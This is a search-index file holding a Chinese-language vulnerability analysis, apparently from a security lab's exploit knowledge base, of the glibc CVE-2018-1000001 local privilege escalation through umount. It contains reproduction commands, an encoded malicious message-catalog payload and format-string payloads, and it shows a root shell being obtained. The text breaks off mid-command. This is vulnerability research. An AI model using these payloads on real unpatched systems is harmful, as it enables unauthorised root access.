{
    "docs": [
        {
            "location": "/",
            "text": "360\u5b89\u5168\u5de5\u7a0b\u7814\u7a76\u9662-\u51b0\u5203\u5b9e\u9a8c\u5ba4\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93",
            "title": "\u524d\u8a00"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/",
            "text": "Glibc\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u5206\u6790(CVE-2018-1000001)\n\n\n0. \u4f5c\u8005\n\n\ninvincible1944@gmail.com\n\n\n1. \u80cc\u666f\u4ecb\u7ecd\n\n\n\n\n\n\n\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6\uff1aglibc <= 2.26\n\n\n\n\n\n\nGLibc\u7b80\u4ecb\n\n\n\n\n\n\nGNU/Linux systems\u7b49\u4f7f\u7528Linux\u5185\u6838\u7cfb\u7edf\u7684\u6838\u5fc3C\u4ee3\u7801\u5e93\n\n\n\n\n\n\n\u8fd9\u4e9b\u4ee3\u7801\u5e93\u63d0\u4f9b\u4e25\u683c\u9075\u5faaISO C11, POSIX.1-2008, BSD\u7b49\u6807\u51c6\u7684API\n\n\n\n\n\n\n\u8fd9\u4e9bAPI\u5305\u542b open, read, write, malloc, printf\u7b49\u57fa\u672c\u51fd\u6570\n\n\n\n\n\n\n\u53c2\u8003\u4e00(GLIBC \u5b98\u7f51)\n, \n\u53c2\u8003\u4e8c(Linux manual)\n\n\n\n\n\n\n\n\n\n\n\u6f0f\u6d1e\u5371\u5bb3\n\n\n\n\n\n\n\u5bf9\u672a\u5b89\u88c5\u8865\u4e01\u7684Linux\u7cfb\u7edf\u8fdb\u884c\u672c\u5730\u63d0\u6743\u3002\n\n\n\n\n\n\n\u53c2\u8003: Known Affected Software Configurations\n\n\n\n\n\n\n\n\n\n\n\u76f8\u5173\u80cc\u666f\u77e5\u8bc6\n\n\nnamespaces\n\n\nuser_namespaces\n\n\nmount_namespaces\n\n\nsetlocale - set the current locale\n\n\nGettext\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n  \n\n\n\n\n\n\n2. \u6f0f\u6d1e\u5206\u6790\n\n\n\n\n\u6f0f\u6d1e\u539f\u7406\uff1a\u7f13\u51b2\u533a\u8fb9\u754c\u5224\u65ad\u4e0d\u4e25\u683c\u9020\u6210\u8d8a\u754c\u5199\u3002\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c\n\n\n\n\n\u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1aglibc <= 2.26  \n\n\n\u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a\nglibc-2.26/stdlib/canonicalize.c -> __realpath( line 122, 199 )\n  \n\n\nGLibc \u5b98\u7f51\nGLibc \u6e90\u7801\u5e93\n  \n\n\n\n\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\uff1a\nCWE-787: Out-of-bounds Write\n\n\n\n\n\u6f0f\u6d1e\u8865\u4e01\uff1a\nglibc upstream\n\n\n\u6f0f\u6d1eCVE\u53f7\uff1a\nCVE-2018-1000001 \n\n\n\n\n3. POC\n\n\na. POC\u539f\u7406\n\n\n\u6784\u9020\u7279\u6b8a\u7684namespace\u8fdb\u7a0b(\u4e0b\u6587\u79f0ns_proc)\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u6784\u5efa\u7279\u6b8a\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u5305\u542b\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u548c\u7279\u5236\u7684NLS\u6587\u4ef6\uff1b\n\n\n\u4f7fumount\u5728ns_proc\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u8fd0\u884c\uff0c\u5378\u8f7d\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u8986\u76d6setloacle\u9700\u8981\u52a0\u8f7d\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\uff0c\u8feb\u4f7f\u5176\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u52a0\u8f7d\u7279\u5236\u7684 NLS\u6587\u4ef6\uff1b\n\n\n\u7279\u5236NLS\u6587\u4ef6\u80fd\u591f\u63a7\u5236umount\u7684error\u4fe1\u606f\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528\n%n\n\u83b7\u53d6\u5199\u5165\u6808\u5185\u5b58\u7684\u80fd\u529b\uff0c\u800c\u521a\u597d\u80fd\u591f\u4fee\u6539umount libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u6807\u5fd7\u4f4d\uff0c\u4f7fumount\u8ba4\u4e3a\u8c03\u7528\u8005\u4e3aroot\u6743\u9650\uff0c\u8fdb\u800c\u5141\u8bb8\u540e\u7eed\u7684\numout /\n\u64cd\u4f5c\uff0c\u4ece\u800c\u5b9e\u73b0DOS\u3002\n\n\nb. POC\u6e90\u7801\n\n\n\u89c1\u9644\u4ef6: cve-2018-1000001-01.md\n\n\nc. \u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u590d\u73b0\u73af\u5883\n\n\n\n\n\n\n\u73af\u5883\u6e05\u5355\n\n\n\n\n\u7cfb\u7edf\u7248\u672c: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux\n\n\n\u53d1\u884c\u7248\u540d\u79f0: Debian GNU/Linux 9 (stretch)\n\n\nglibc\u7248\u672c:  Debian GLIBC 2.24-11+deb9u4\n\n\ngcc\u7248\u672c:  gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\n\n\numount\u7248\u672c: umount from util-linux 2.29.2 \n\n\n\u955c\u50cf\u4e0b\u8f7d\u5730\u5740\uff1a\ndebian-9.12.0-amd64-DVD-1.iso\n\n\n\u865a\u62df\u673a\u8f6f\u4ef6\uff1aVMwareFusion \u4e13\u4e1a\u7248 11.5.1 (15018442)\n\n\n\u865a\u62df\u673a\u8f6f\u4ef6\uff1aQEMU emulator version 4.2.0\n\n\n\n\n\n\n\n\nQEMU\u865a\u62df\u673a\u642d\u5efa\u6b65\u9aa4\uff1a\n\n\n\n\n\n\n\n\n\n\n# 1. \u53bb\u4e0a\u9762\ud83d\udc46\u7ed9\u51fa\u7684\u5730\u5740\u5904\u4e0b\u8f7d\u955c\u50cf\n# 2. \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n$ qemu-img create -f qcow2 debian9.img 10G\n\n# 3. \u5b89\u88c5\u865a\u62df\u673a(\u6709\u6761\u4ef6\u53ef\u4ee5\u589e\u52a0-enable-kvm\u9009\u9879)\n# \u5224\u65ad\u65b9\u6cd5\uff1a\n#   grep -E 'vmx|svm' /proc/cpuinfo\n#   lsmod | grep kvm\n$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso\n\n# 4. \u542f\u52a8\u865a\u62df\u673a\n$ qemu-system-x86_64 -m 2048  debian9.img\n\n# 5. \u542f\u52a8\u540e\u5b89\u88c5GCC\n$ su\n$ apt install gcc\n\n\n\n\n\n\n\nStep1 - \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650\n\n\n\n\n# \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n\n\n\n\n\n\nStep2 - \u521b\u5efa\u5177\u6709\u72ec\u7acb user/mount namespace\u7684\u8fdb\u7a0b(\u4e0b\u6587\u79f0us_proc)\n\n\n\n\n\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u5165\nus_proc\n\u8fdb\u7a0b\u7684\n\"/proc/[us_proc pid]/cwd\"\n\u76ee\u5f55\u540e\uff0c\u7528\nrealpath(getcwd)\n\u83b7\u53d6\u7684\u76f8\u5bf9\u76ee\u5f55\u5747\u5305\u542b\n\"(unreachable)/tmp/\"\n\u524d\u7f00\n\n\n/usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\n\n# Terminal 1\ndebian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash\nroot@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp\nroot@debian:~/Desktop/work# cd /tmp\nroot@debian:/tmp# chmod 00755 .\nroot@debian:/tmp# echo $$\n52426\nroot@debian:/tmp# \n\n# \u6548\u679c\u5982\u4e0b\n# Terminal 2\n$ cd /proc/52426/cwd\ndebian@debian:/proc/52426/cwd$ \ndebian@debian:/proc/52426/cwd$ realpath .\n(unreachable)/tmp\ndebian@debian:/proc/52426/cwd$ realpath ../x\n(unreachable)/x\ndebian@debian:/proc/52426/cwd\n\n\n\n\n\n\n\n\n\nStep3 - \u521b\u5efa\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u7684\u76ee\u5f55\u548c\u6587\u4ef6\n\n\n\n\n__gconv_find_shlib/C/LC_MESSAGES\n\u76ee\u5f55\u662fsetloacale\u5bfb\u627emo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\n    \u7279\u522b\u8981\u6ce8\u610f\u7684\u4e00\u70b9\uff1a\n__gconv_find_shlib\n \u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u4e0d\u4e00\u6837\uff0c\u5728\u6f0f\u6d1e\u4f5c\u8005\u7684exp\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u4e24\u4e2a\u76ee\u5f55(\nfrom_archive, _nl_load_locale_from_archive\n) \uff1b\n\n\n\"(unreachable)/x\"\n \u662frealpath\u89e3\u6790\u7b26\u53f7\u94fe\u63a5\u7684\u8fd4\u56de\u503c\u5bf9\u5e94\u7684\u76ee\u5f55\uff1b\n\n\nutil-linux.mo\n\u6587\u4ef6\u7528\u4e8e\u4fdd\u5b58\u7279\u5236\u7684libc\u4f9d\u8d56\u7684.mo\u7ffb\u8bd1\u6587\u4ef6\uff1b\n\n\n\u7b26\u53f7\u94fe\u63a5\u7528\u4e8e\u89e6\u53d1\u8d8a\u754c\u5199\u6f0f\u6d1e\uff1b\n\n\nutil-linux.mo\n\u4fdd\u5b58\u4e86\u89e6\u53d1DOS\u7684\u7279\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\"AA%6$lnlnAAAAAAAAAA\"\n\u3002\n\n\n\n\n\n\n\n\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\nbase64 -d <<B64-EOF | bzip2 -cd > \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\nQlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\nmQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\niG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\nB64-EOF\n\nroot@debian:/tmp# tree\n.\n\u2514\u2500\u2500 (unreachable)\n    \u251c\u2500\u2500 tmp\n    \u2502   \u251c\u2500\u2500 down -> ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\n    \u2502   \u2514\u2500\u2500 __gconv_find_shlib\n    \u2502       \u2514\u2500\u2500 C\n    \u2502           \u2514\u2500\u2500 LC_MESSAGES\n    \u2502               \u2514\u2500\u2500 util-linux.mo\n    \u2514\u2500\u2500 x\n\n\nroot@debian:/tmp# strings \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\n%s: not mounted\nLanguage: en\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\nAA%6$lnlnAAAAAAAAAA\n\n\n\n\n\n\n\n\n\nStep4 - \u901a\u8fc7umount\u89e6\u53d1DOS\n\n\n\n\n\n\nLC_ALL\u73af\u5883\u53d8\u91cf\u4f1a\u4f7fsetlocale\u51fd\u6570\u53bb\u52a0\u8f7d\u7ffb\u8bd1\u6587\u4ef6\uff1b\n\n\n\n\n\n\numount\u4f1a\u5148\u5c1d\u8bd5\u5378\u8f7ddown\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u4f1a\u89e6\u53d1realpath\u6f0f\u6d1e\u9020\u6210\u8d8a\u754c\u5199\uff0c\u5c06\u5806\u5185\u5b58\u4e2d\u7684\n\"/usr/lib/locale/C.utf8/LC_CTYPE\"\n\u8def\u5f84\u5b57\u7b26\u4e32\u4e2dLC_CTYPE\u8986\u76d6\u4e3a\nAAAAAA(\u7565...)/A\n\uff1b\n\n\n\n\n\n\n\u5f53realpath\u5c06down\u89e3\u6790\u4e3a(unreachable)/x\u540e\uff0cumount\u4f1a\u8c03\u7528warnx\u51fd\u6570\u6253\u5370\u8b66\u544a\u4fe1\u606f\uff0c\u6b64\u65f6\u4f1a\u52a0\u8f7d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c\n\"AA%6$lnlnAAAAAAAAAA\"\n\u66ff\u6362\u6389warnx\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\n\"%s: not mounted\"\n\uff1b\n\n\n\n\n\n\n\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0cumount\u6808\u4e2dRSP\u5b58\u653e\u7684\u5730\u5740\u5904\u7684\u6307\u9488\u6307\u5411\u7684\nlong int\u503c(*(long *)$RSP)\n\u4f1a\u88ab\u4fee\u6539\u4e3a2\u3002\u8fd9\u4f1a\u5c06\u8be5\u5904\u5b58\u653e\u7684libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u5b57\u6bb5\u4fee\u6539\u4e3a0, \u4ece\u800c\u8ba9umount\u8ba4\u4e3a\u8c03\u7528\u8005\u662froot\u7528\u6237\uff0c\u5e76\u6210\u529f\u8fdb\u884c\u540e\u9762\u7684umount / \u64cd\u4f5c\u3002\n\n\n\u8fd9\u4e2a\u6b65\u9aa4\u76f8\u5173\u7684umount\u8c03\u7528\u6808:\n\n\nmain->umount_one->make_exit_code->warnx(_(\"%s: not mounted\"), tgt);\n\n\n( \n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n , \nx64\u4f20\u53c2\u987a\u5e8f\n )\n\n\n\n\n\n\n\n\n\n\ntest$ cd /proc/2299/cwd\ntest$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\nAAlnAAAAAAAAAA\n\n\n\n\n4. EXP\n\n\na. EXP\u539f\u7406\n\n\n\u51c6\u5907\u9636\u6bb5(prepareNamespacedProcess)\n\n\n\n\n\u5148\u901a\u8fc7clone\u542f\u52a8\u4e00\u4e2a\u62e5\u6709\u72ec\u7acb\nuser & mount namespace\n\u7684\u5b50\u8fdb\u7a0b\uff0c\n  \u5b50\u8fdb\u7a0b\u542f\u52a8\u540e\uff0c\u4f1a\u5148\u7b49\u5f85\u7236\u8fdb\u7a0b\u5c06\u5176uid\u548cgid\u8bbe\u7f6e\u4e3a0(\u5f53\u524dnamespace)\n  \u7136\u540e\nmount tmpfs\n\u5230\n/tmp\n\u76ee\u5f55\uff0c\u5e76\u5207\u6362\u5230\n/tmp\n\u4f5c\u4e3a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\n  \u521b\u5efa\u4e00\u4e2aready\u6587\u4ef6(\nO_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY\n)\n\n\n\n\n\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4fe1\u606f\n\n\n\n\n\n\n\u5728clone\u51fa\u7684\u5b50\u8fdb\u7a0b\u5de5\u4f5c\u76ee\u5f55(\n/proc/[pid]/cwd\n)\u4e2d\u751f\u6210\u4e00\u7cfb\u5217\u6587\u4ef6\u548c\u76ee\u5f55\n\n\n\n\n\n\n\u751f\u6210\u7684\u6587\u4ef6\u5982\u4e0b\uff1a\n\n\ninvincible@ubuntu:/proc/10013/cwd$ tree\n.\n\u251c\u2500\u2500 DATEMSK\n\u251c\u2500\u2500 ready\n\u2514\u2500\u2500 (unreachable)\n    \u251c\u2500\u2500 tmp\n    \u2502   \u251c\u2500\u2500 down -> ../x/../../AAA(\u7701\u7565...)A/AAA(\u7701\u7565...)A/A\n    \u2502   \u2514\u2500\u2500 from_archive\n    \u2502       \u251c\u2500\u2500 C.UTF-8\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2502       \u2514\u2500\u2500 util-linux.mo\n    \u2502       \u251c\u2500\u2500 X.x\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2514\u2500\u2500 X.X\n    \u2502           \u2514\u2500\u2500 LC_MESSAGES\n    \u2502               \u2514\u2500\u2500 util-linux.mo\n    \u2514\u2500\u2500 x\n\n\n10 directories, 5 files \ninvincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable\n\ninvincible@ubuntu:/proc/10013/cwd$ \ninvincible@ubuntu:/proc/10013/cwd$ file ready \nready: empty\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: fifo (named pipe)\n\n\n\n\n\n\u6784\u9020\u7684DATEMSK\u6587\u4ef6\u5185\u5bb9\u4e3a/proc/self/exe\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u7684\u6587\u4ef6:\n\n\ninvincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl\n\n\n\n\n\n\u6784\u9020\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\u5185\u5bb9:\n\n\ninvincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po\ninvincible@ubuntu:~/Desktop/test$ cat util-linux.po \nmsgid \"\"\nmsgstr \"\"\n\"Language: en\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\nmsgstr \"1234\"\n\n\nmsgid \"%s: not mounted\"\nmsgstr \"\"\n\"AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n(\u7701\u7565... \u5171256\u4e2a%16lx)\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn\"\n\n\nmsgid \"\"\n\"%s: target is busy\\n\"\n\"        (In some cases useful info about processes that\\n\"\n\"         use the device is found by lsof(8) or fuser(1).)\"\nmsgstr \"5678\"\ninvincible@ubuntu:~/Desktop/test$ \n\n\n\n\n\n\u63d0\u6743\u9636\u6bb5(attemptEscalation)\n\n\n\n\n\n\n\u51c6\u5907\u5de5\u4f5c\n\n\n\n\n\n\n\u521b\u5efa\u7528\u4e8e\u548c\u5b50\u8fdb\u7a0b\u901a\u4fe1\u7684pipe\u7528\u4e8e\u8bfb\u53d6\u5b50\u8fdb\u7a0bstdout\u548cstderr\n\n\n\n\n\n\nfork\u51fa\u5b50\u8fdb\u7a0b(\u4e0b\u6587\u79f0\numount\u8fdb\u7a0b\n)\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u8bbe\u7f6epipe\uff0c\u5207\u6362\u5230\nus_proc\u8fdb\u7a0b\n\u7684\u5de5\u4f5c\u76ee\u5f55\uff0cexecve\u6267\u884cumount\uff0c\u5177\u4f53\u6267\u884c\u547d\u4ee4\uff1a\n\n\n\n\n\n\n\n\n\n\nAANGUAGE=X.X AANGUAGE=X.X (\u7701\u7565...\u5171255\u6b21) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0\n\n\n\n\n\n\n\n\n\n\u5f00\u59cb\u63d0\u6743\n\n\n\n\n\u7b2c0\u6b65\uff0c\u7236\u8fdb\u7a0b\u5f00\u59cb\u6301\u7eed\u8bfb\u53d6umount\u8fdb\u7a0b\u7684\u8f93\u51fa\uff0c\u7b49\u5f85\"AAAAAAAA\"\u5b57\u7b26\u4e32\u7684\u51fa\u73b0\n\n\n\u7b2c1\u6b65\uff0c\u8bfb\u53d6\u5b8c\u6574\u7684\u6808\u5185\u5b58\u6570\u636e\uff0c\u5e76\u5f00\u59cb\u89e3\u6790\uff0c\u6784\u9020\u7b2c\u4e8c\u9636\u6bb5\u7684util-linx.mo\u6587\u4ef6\u5185\u5bb9\u5e76\u5199\u5165\n\n\n\u7b2c2\u6b65\uff0c\u6301\u7eed\u7b49\u5f85\uff0c\u76f4\u5230\u5728\u8d85\u65f6\u65f6\u95f4\u5185\uff0c\u7b2c\u4e8c\u9636\u6bb5util-linux.mo\u6587\u4ef6\u5185\u5bb9\u88abumount\u8bfb\u53d6\n\n\n\u7b2c3\u6b65\uff0c\u8bfb\u53d6\u5269\u4e0b\u7684umount\u8f93\u51fa\u9632\u6b62\u5176\u88ab\u963b\u585e\n\n\numount\u90e8\u5206\uff1a \n\n\numount\u542f\u52a8\u540e\uff0c\u89e3\u6790\u7b26\u53f7\u94fe\u63a5down\u4f1a\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4f7f\u5806\u5185\u5b58\u4e2d\u5b58\u653e\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\u5931\u6548\uff0c\u8feb\u4f7f\u5176\u52a0\u8f7d\u4f4d\u4e8e\u76f8\u5bf9\u76ee\u5f55C.UTF-8/LC_MESSAGES/\u4e2d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684 poisonous format string \u4f1a\u5c06\u6808\u5185\u5b58dump\u5230stderr\uff0c\u540c\u65f6\u8fd8\u4f1a\u901a\u8fc7\u6307\u5411\u73af\u5883\u53d8\u91cf\u7684\u6307\u9488\uff0c\u5c06\"AANGUAGE=X.X\"\u4fee\u6539\u4e3a\"LANGUAGE=X.X\"\n\n\numount\u7ee7\u7eed\u6267\u884c\uff0c\u7531\u4e8e\u73af\u5883\u53d8\u91cf\u88ab\u4fee\u6539\uff0c\u8fd9\u5c06\u4f7fumount\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5\u7684util-linux.mo\u6587\u4ef6(\u4f4d\u4e8eX.X/LC_MESSAGES\u76ee\u5f55\u4e0b\uff0c\u7531\u4e8e\u8be5\u6587\u4ef6\u4e3afifo named pipe\uff0c\u6240\u4ee5\u8fd9\u91ccumoun\u4f1a\u963b\u585e\u7b49\u5f85\u5176\u88ab\u5199\u5165\u6570\u636e)\n\n\numount\u8fdb\u7a0b\u5728\u7236\u8fdb\u7a0b\u7b2c1\u6b65\u5b8c\u6210\u540e\u6062\u590d\u6267\u884c\uff0c\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5c06\u4f1a\u4fee\u6539umount\u7684\u8fd4\u56de\u5730\u5740\uff0c\u901a\u8fc7setdate+execl\u5b9e\u73b0ROP\uff0c\u6700\u7ec8\u6267\u884cDATEMSK\u6587\u4ef6\u4e2d\u7684exp\u8fdb\u7a0b\uff0c\u5229\u7528umount\u63d0\u5347exp\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6743\u9650\u540e\u6267\u884c\uff0c\u751f\u6210root shell\u5b8c\u6210\u63d0\u6743\n\n\n\n\n\n\n\n\n\n\n\n\ndump\u6808\u5185\u5b58\uff0c\u4fee\u6539restricted\u5b57\u6bb5\uff0c\u4fee\u6539AANGUAGE\u73af\u5883\u53d8\u91cf\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\n\n\n\n\"AA%6$lnAAAAAA%016lx(\u7701\u7565... \u5171256\u4e2a%016lx)%016lx%1$68hhx%256$hhn\"\n\n\n\n\n\n\n\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\n\ndebian@debian:~/Desktop/work$ msgunfmt \"/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo\" -o util-linux.po\ndebian@debian:~/Desktop/work$ cat util-linux.po \nmsgid \"\"\nmsgstr \"\"\n\"Language: en\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\nmsgstr \"\"\n\"%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn\"\n\"%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn\"\n\"%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-\"\n\"%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s\\n\"\n\n\nmsgid \"%s: not mounted\"\nmsgstr \"BBBB5678%3$s\\n\"\n\n\nmsgid \"\"\n\"%s: target is busy\\n\"\n\"        (In some cases useful info about processes that\\n\"\n\"         use the device is found by lsof(8) or fuser(1).)\"\nmsgstr \"BBBBABCD%s\\n\"\n\n\n\n\n\nb. EXP\u6e90\u7801\n\n\n\u200b   \u590d\u73b0\u73af\u5883exp\uff0c\u89c1\u9644\u4ef6cve-2018-1000001-01.md\n\n\n\u200b   \u539f\u4f5c\u8005exp: \nexp.c\n\n\nc. \u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePOC\u4e2d\u7684\u73af\u5883\u76f8\u540c\n\n\n\n\n\n\n\u6b65\u9aa4\u4e00 \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650\n\n\n\n\n\n\n# \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n\n\n\n\n\n\n\n\n\u6b65\u9aa4\u4e8c  \u7f16\u8bd1exp\u6587\u4ef6\n\n\n\u4f7f\u7528\u7684\u662f\u4fee\u6539\u8fc7\u7684exp\uff0c\u5177\u4f53\u4fee\u6539\u4e86\u52a0\u8f7dmo\u7684\u76ee\u5f55\u548cexecl\u7684\u76f8\u5bf9\u504f\u79fb\u4ee5\u9002\u914d\u590d\u73b0\u73af\u5883\n\n\n\n\n\n\ngcc exp.c -o exp    \n\n\n\n\n\n\n\u6b65\u9aa4\u4e09 \u6267\u884cexp\n\n\n\n\ndebian@debian:~/Desktop/work$ id\nuid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)\ndebian@debian:~/Desktop/work$ ./exp\n./exp: invoked as SUID, invoking shell ...\nroot@debian:~/Desktop/work# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)\nroot@debian:~/Desktop/work# \n\n\n\n\n\n\n\n\u5982\u4f55\u83b7\u53d6util-linx.mo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\n\n\n\n\n# \u5b9a\u4f4d\u5230_nl_find_msg\u8c03\u7528\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\nchar *_nl_find_msg (struct loaded_l10nfile *domain_file,\n            struct binding *domainbinding, const char *msgid,\n            int convert, size_t *lengthp)\n     internal_function;\n\n\n# Terminal 1\n/usr/bin/unshare 